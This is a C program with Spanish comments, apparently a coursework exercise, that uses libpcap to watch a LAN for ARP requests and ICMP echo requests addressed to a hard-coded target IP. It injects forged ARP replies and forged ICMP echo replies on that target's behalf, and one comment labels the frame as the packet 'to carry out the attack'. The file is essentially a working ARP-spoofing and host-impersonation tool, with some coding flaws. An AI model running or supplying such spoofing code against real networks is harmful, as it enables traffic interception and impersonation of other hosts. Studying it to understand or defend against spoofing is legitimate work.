#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>

#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>

#include <net/ethernet.h>
#include <netinet/ether.h>

#include <net/if_arp.h>

#include <string.h>


//ejecutar ./capturaIcmp icmp 100
#define LIMITE 100


typedef enum{ REQUEST=1, REPLY} ARPtype;


void listarInterfaces();
int enviarReply(pcap_t * pcap, u_int8_t *miMac,u_int8_t *senderIP, u_int8_t *destinationMac,u_int8_t *destinationIP);
int enviarICMPReply(pcap_t* pcap,u_int8_t* senderMac, u_int32_t senderIp, 
  u_int8_t* destinationMac, u_int32_t  destinationIp,
  u_int16_t secuencia,u_int16_t id,u_int16_t check,u_int32_t  gateway,void*payload,int payload_len
  );
unsigned short in_cksum(unsigned short *addr, int len);

//variable global
char* targetIP = "192.168.0.103";   //IP del dispositivo target, localhost por defecto
char * mimac = "e4:d5:3d:11:53:01"; //Mac del target
pcap_t* descr; 

void callback(u_char *useless,const struct pcap_pkthdr* header,const u_char* packet){
  static int count = 1;
  int size_eth=sizeof(struct ethhdr); //tamanio de la cabezera
  struct ether_header *h_ethernet;//puntero a la cabezera ethernet
  h_ethernet = (struct ether_header *) packet;
  //printf("Paquete %d\n",count);
  count++;

  u_int8_t *miMac;
  miMac=(u_int8_t*)malloc(sizeof(u_int8_t)*ETH_ALEN);
  struct ether_addr* Mac = (struct ether_addr*)ether_aton(mimac);
  miMac = Mac->ether_addr_octet; 


  if (ntohs(h_ethernet->ether_type)== ETHERTYPE_ARP){
     //analisis arp
    struct ether_arp *h_arp;
    h_arp=(struct ether_arp*)(packet+size_eth);
    char* destinationIp=(char*)malloc(sizeof(char)*18);
    ARPtype type;

    strcpy(destinationIp,inet_ntoa(*( (struct in_addr*) h_arp->arp_tpa) ));//la ip del target
    //strcpy(senderMac,(ether_ntoa((struct ether_addr*)h_arp->arp_sha))); //produce error???
    //strcpy(senderIp,inet_ntoa(*((struct in_addr*)h_arp->arp_spa) ));//produce error???
    type=ntohs(h_arp->ea_hdr.ar_op);

    if (type == REQUEST && strcmp(targetIP,destinationIp)==0){    
      printf("\nDEBUG: ARP REQUEST al Target\n");
      enviarReply(descr,miMac, h_arp->arp_tpa, h_arp->arp_sha, h_arp->arp_spa);

    }
  }else{ //si no se arp es un paquete IP
    struct iphdr *iph;//puntero a la cabezera ip
    char *destinationIp;
    iph=(struct iphdr*)(packet+size_eth);   
    
    int size_ip=(iph->ihl)*4;//tamaño de cabezera ip  
    struct in_addr *dir=malloc(sizeof(struct in_addr));
    dir->s_addr=iph->daddr;
    destinationIp=inet_ntoa(*dir);//destino del icmp packet

    struct icmphdr *icmph;//puntero a paquete icmp
    icmph=(struct icmphdr*)(packet+size_eth+size_ip);

    if(icmph->type==ICMP_ECHO&&strcmp(targetIP,destinationIp)==0){
        printf("DEBUG: ICMP ECHO al Target\n");
        in_addr_t miIp=inet_addr(targetIP);//mi direccion ip
        int size=size_eth+size_ip+sizeof(struct icmphdr);
        int payload_len=header->len - size;
        void*payload;
        payload=(void*)(packet+size);
        int i;
        enviarICMPReply(descr,miMac,miIp,h_ethernet->ether_shost,iph->saddr,
                       icmph->un.echo.sequence,icmph->un.echo.id,icmph->checksum,icmph->un.gateway,
                       payload,payload_len);
        printf("DEBUG: ICMP ECHO REPLY del Target\n");
    }

  }
}

int main(int argc,char **argv)
{
    char *dev;
    int max=10;
    char errbuf[PCAP_ERRBUF_SIZE];
    struct bpf_program fp;        /* to hold compiled program */
    bpf_u_int32 pMask;            /* subnet mask */
    bpf_u_int32 pNet;             /* ip address*/
    pcap_if_t *alldevs, *d;
    char dev_buff[64] = {0};
    int i =0;
    char* filtro = "icmp or arp";
    dev = (char*)malloc(sizeof(char)*20);
    
    
    printf("Lista de Interfaces:\n");
    listarInterfaces();

    printf("\nIngrese la interfaz de red: ");
    scanf("%s",dev);

    if(strlen(dev))
    {
        printf("\n ---You opted for device [%s] to capture [%d] packets---\n\n Starting capture...",dev, LIMITE);
    }     

    // If something was not provided
    // return error.
    if(dev == NULL)
    {
        printf("\n[%s]\n", errbuf);
        return -1;
    }

    // fetch the network address and network mask
    pcap_lookupnet(dev, &pNet, &pMask, errbuf);

    // Now, open device for sniffing
    descr = pcap_open_live(dev, BUFSIZ, 0,-1, errbuf);
    if(descr == NULL)
    {
        printf("DEBUG: pcap_open_live() failed due to [%s]\n", errbuf);
        return -1;
    }

    // Compile the filter expression
    if(pcap_compile(descr, &fp, filtro, 0, pNet) == -1)
    {
        printf("\npcap_compile() failed\n");
        return -1;
    }

    // Set the filter compiled above
    if(pcap_setfilter(descr, &fp) == -1)
    {
        printf("\npcap_setfilter() failed\n");
        exit(1);
    }

    // For every packet received, call the callback function
    // For now, maximum limit on number of packets is specified
    // by user.
    pcap_loop(descr,-1, callback, NULL);

    printf("\nDone with packet sniffing!\n");
    return 0;

}


void listarInterfaces(){
	
   char errbuf[PCAP_ERRBUF_SIZE]; // buﬀer para mensajes de error
   pcap_if_t*current_device;

    if(pcap_findalldevs(&current_device,errbuf)==-1){
		printf("DEBUG: %s",errbuf);
	}

	while(current_device->next!=NULL){
		printf("Nombre del dispositivo: %s\n",current_device->name); //mostramos el nombre del dispositivo
		current_device=current_device->next;
	}

}

int enviarReply(pcap_t * pcap, u_int8_t *miMac,u_int8_t *senderIP, u_int8_t *destinationMac,u_int8_t *destinationIP){
  printf("DEBUG: ARP REPLY del Target\n");
  //construccion de la cabezera ethernet
  struct ether_header *ether_h=(struct ether_header*)malloc(sizeof(struct ether_header));
  ether_h->ether_type = htons(ETHERTYPE_ARP);
  memcpy(ether_h->ether_shost,miMac,sizeof(ether_h->ether_shost));//source maac
  memcpy(ether_h->ether_dhost,destinationMac,sizeof(ether_h->ether_dhost));//destination mac

    //construccion del arp reply
  struct ether_arp *reply=(struct ether_arp*)malloc(sizeof(struct ether_arp));
  reply->arp_hrd=htons(ARPHRD_ETHER);
  reply->arp_pro = htons(ETH_P_IP);
  reply->arp_hln = ETHER_ADDR_LEN;
  reply->arp_pln =sizeof(in_addr_t);
  reply->arp_op =htons(ARPOP_REPLY);
  memcpy(reply->arp_sha,miMac,sizeof(reply->arp_sha));
  memcpy(reply->arp_spa,senderIP,sizeof(reply->arp_spa));
  memcpy(reply->arp_tha,destinationMac,sizeof(reply->arp_tha));
  memcpy(reply->arp_tpa,destinationIP,sizeof(reply->arp_tpa));
    
  //construccion del paquete para realizar el ataque     
  unsigned char frame[sizeof(struct ether_header) + sizeof(struct ether_arp)];
  memcpy(frame,ether_h, sizeof(struct ether_header) );
  memcpy(frame + sizeof(struct ether_header),reply,sizeof(struct ether_arp) ); 
          
  if(pcap_inject(pcap, frame, sizeof(frame)) == -1){
    return 0;
  }
  return 1;  
}

int enviarICMPReply(pcap_t* pcap,u_int8_t* senderMac, u_int32_t senderIp, 
  u_int8_t* destinationMac, u_int32_t  destinationIp,
  u_int16_t secuencia,u_int16_t id,u_int16_t check,u_int32_t  gateway,void*payload,int payload_len
  ){
  //cabezera ethernet
  int sizeEthernet=sizeof(struct ether_header);
  struct ether_header *ether_h=(struct ether_header*)malloc(sizeEthernet);
  ether_h->ether_type = htons(ETHERTYPE_IP);
  memcpy(ether_h->ether_shost,senderMac,sizeof(ether_h->ether_shost));//source maac
  memcpy(ether_h->ether_dhost,destinationMac,sizeof(ether_h->ether_dhost));//destination mac

  //cabezera ip
  int sizeIp=sizeof(struct iphdr);
  struct iphdr*ip;
  ip=(struct iphdr*)malloc(sizeIp);
  ip->version=4;
  ip->ihl=(sizeof(struct iphdr))/4;
  ip->tos=0;
  ip->tot_len=htons(sizeof(struct iphdr)+sizeof(struct icmphdr)+payload_len*sizeof(u_char));
  ip->frag_off=0;
  ip->id=0;
  ip->saddr=senderIp;
  ip->daddr=destinationIp;
  ip->ttl=64;
  ip->protocol=IPPROTO_ICMP;

  //cabezera icmp
  int sizeIcmp=sizeof(struct icmphdr);
  struct icmphdr*icmp;
  icmp=(struct icmphdr*)malloc(sizeIcmp);
  icmp->type=htons(ICMP_ECHOREPLY);
  icmp->code=htons(0);
  icmp->checksum=0;
  icmp->un.echo.id=id;
  icmp->un.echo.sequence=secuencia;
  icmp->un.gateway=gateway;

  u_char *pdu;
  pdu=(u_char*)malloc(payload_len*sizeof(u_char));
  int i;
  for(i=0;i<payload_len;i++){
    *(pdu+i)=*((u_char*)payload+i);
  }

  //calculo de checksum para icmp
  u_char*tmp;
  tmp=(u_char*)malloc(sizeIcmp+payload_len*sizeof(u_char));
  memcpy(tmp,icmp,sizeIcmp);
  memcpy(tmp+sizeIcmp,pdu,payload_len);
  icmp->checksum=in_cksum((unsigned short*)tmp,sizeIcmp+payload_len);

  //calculo de checksum para ip
  u_char*temp;
  temp=(u_char*)malloc(sizeIp+sizeIcmp+payload_len*sizeof(u_char));
  memcpy(temp,ip,sizeIp);
  memcpy(temp+sizeIp,icmp,sizeIcmp);
  memcpy(temp+sizeIp+sizeIcmp,pdu,payload_len);
  ip->check=in_cksum((unsigned short*)temp,sizeIp+sizeIcmp+payload_len);  

  //construccion de paquete de respuesta
  unsigned char packet[sizeEthernet+sizeIp+sizeIcmp+payload_len];
  memcpy(packet,ether_h,sizeEthernet);
  memcpy(packet+sizeEthernet,ip,sizeIp);
  memcpy(packet+sizeEthernet+sizeIp,icmp,sizeIcmp);  
  memcpy(packet+sizeEthernet+sizeIp+sizeIcmp,pdu,payload_len);

  if(pcap_inject(pcap,packet, sizeof(packet)) == -1){
    return 0;
  }
  return 1;  
}

unsigned short in_cksum(unsigned short *addr, int len){
    register int sum = 0;
    u_short answer = 0;
    register u_short *w = addr;
    register int nleft = len;
    /*
     * Our algorithm is simple, using a 32 bit accumulator (sum), we add
     * sequential 16 bit words to it, and at the end, fold back all the
     * carry bits from the top 16 bits into the lower 16 bits.
     */
    while (nleft > 1)
    {
      sum += *w++;
      nleft -= 2;
    }
    /* mop up an odd byte, if necessary */
    if (nleft == 1)
    {
      *(u_char *) (&answer) = *(u_char *) w;
      sum += answer;
    }
    /* add back carry outs from top 16 bits to low 16 bits */
    sum = (sum >> 16) + (sum & 0xffff);     /* add hi 16 to low 16 */
    sum += (sum >> 16);             /* add carry */
    answer = ~sum;              /* truncate to 16 bits */
    return (answer);
}